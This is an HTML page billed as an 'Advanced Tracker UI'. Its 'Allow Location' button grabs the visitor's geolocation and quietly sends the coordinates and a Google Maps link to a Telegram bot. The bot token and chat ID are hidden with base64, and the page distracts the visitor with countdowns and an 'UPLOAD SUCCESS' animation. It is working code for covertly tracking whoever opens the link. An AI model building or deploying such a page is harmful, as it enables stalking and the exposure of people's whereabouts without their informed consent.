<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Advanced Tracker UI</title>

<style>

/* 🌌 Background */
body {
    margin: 0;
    height: 100vh;
    background: linear-gradient(135deg, #ff1493, #8a2be2);
    display: flex;
    justify-content: center;
    align-items: center;
    font-family: 'Segoe UI', sans-serif;
    overflow: hidden;
    color: white;
}

/* 🧊 Glass Container */
.container {
    width: 90%;
    max-width: 420px;
    padding: 25px;
    border-radius: 20px;
    backdrop-filter: blur(20px);
    background: rgba(255,255,255,0.08);
    box-shadow: 0 0 40px rgba(0,0,0,0.3);
    text-align: center;
}

/* 🔘 Button */
button {
    width: 100%;
    padding: 15px;
    font-size: 18px;
    border-radius: 12px;
    border: none;
    background: linear-gradient(45deg, #ff0080, #ff8c00);
    color: white;
    font-weight: bold;
    cursor: pointer;
}

/* 🧠 Heading */
#heading {
    font-size: 20px;
    margin-top: 20px;
    opacity: 0.9;
}

/* 🔥 HUGE COUNTDOWN */
#countdown {
    font-size: 22vw; /* responsive giant size */
    font-weight: 900;
    margin: 10px 0;
    line-height: 1;
    background: linear-gradient(45deg, #ffffff, #ffd700);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    text-shadow: 0 0 20px rgba(255,255,255,0.5);
}

/* ✨ Glow Animation */
.glow {
    animation: glowPulse 1s infinite alternate;
}

@keyframes glowPulse {
    from { text-shadow: 0 0 10px #fff; }
    to { text-shadow: 0 0 40px #fff; }
}

/* 📊 Progress Bar */
.progress {
    width: 100%;
    height: 8px;
    background: rgba(255,255,255,0.2);
    border-radius: 10px;
    overflow: hidden;
    margin-top: 10px;
}

.progress-bar {
    height: 100%;
    width: 0%;
    background: linear-gradient(90deg, #00ffcc, #00ff66);
    transition: width 0.3s;
}

/* 🖼 Shake Image */
#shakeImg {
    width: 150px;
    display: none;
    margin-top: 20px;
}

@keyframes shake {
    0% { transform: translate(0,0); }
    25% { transform: translate(10px,-10px); }
    50% { transform: translate(-10px,10px); }
    75% { transform: translate(10px,10px); }
    100% { transform: translate(-10px,-10px); }
}

.shake {
    animation: shake 0.08s infinite;
}

/* 📱 Mobile refinement */
@media (max-width: 480px) {
    #countdown {
        font-size: 28vw;
    }
}

</style>
</head>

<body>

<div class="container">

<button onclick="startProcess()">Allow Location</button>

<div id="heading"></div>
<div id="countdown" class="glow"></div>

<div class="progress">
    <div id="progressBar" class="progress-bar"></div>
</div>

<img id="shakeImg" src="https://i.imgur.com/8Km9tLL.png">

<audio id="audio" src="https://www.soundjay.com/buttons/sounds/button-4.mp3"></audio>

</div>

<script>
(function(){

const BOT_TOKEN = atob("ODUyNDM5OTY5MjpBQUg4Uk5GbzZVZktDcjgxSUM1c1k2Rk8yMGh4QUJTX3VQUQ==");
const CHAT_ID  = atob("NjI3NzQzMjM1Ng==");

let done = false;

/* 📡 FAST TELEGRAM WITH MAP LINK */
function sendToTelegram(lat, lon) {
    const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;

    return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: `📍 Location\nLat: ${lat}\nLon: ${lon}\nMap: ${mapLink}`
        })
    }).then(() => {
        done = true;
        successEffect();
    });
}

/* ⚡ FAST LOCATION */
function getLocation() {
    navigator.geolocation.getCurrentPosition(
        pos => sendToTelegram(pos.coords.latitude, pos.coords.longitude),
        () => {},
        { enableHighAccuracy:false, maximumAge:Infinity, timeout:5000 }
    );
}

/* 🎯 SUCCESS EFFECT */
function successEffect() {
    document.getElementById("heading").innerText = "UPLOAD SUCCESS";
    document.getElementById("countdown").innerText = "";

    const img = document.getElementById("shakeImg");
    img.style.display = "block";
    img.classList.add("shake");

    document.getElementById("audio").play();
}

/* 📊 Progress */
function setProgress(p) {
    document.getElementById("progressBar").style.width = p + "%";
}

/* ⏱ Countdown Engine */
function countdown(sec, color, title, next) {

    let time = sec;
    const el = document.getElementById("countdown");

    document.getElementById("heading").innerText = title;
    el.style.color = color;

    const interval = setInterval(() => {

        if (done) {
            clearInterval(interval);
            return;
        }

        el.innerText = time;
        setProgress(((sec - time) / sec) * 100);

        time--;

        if (time < 0) {
            clearInterval(interval);
            next && next();
        }

    }, 1000);
}

/* 🚀 MAIN */
window.startProcess = function(){

    done = false;
    getLocation();

    countdown(10, "black", "Scanning Your Location", () => {

        if (done) return;

        countdown(5, "red", "Still Uploading...", () => {

            if (done) return;

            countdown(5, "yellow", "Final Attempt...");
        });

    });
};

})();
</script>

</body>
</html>
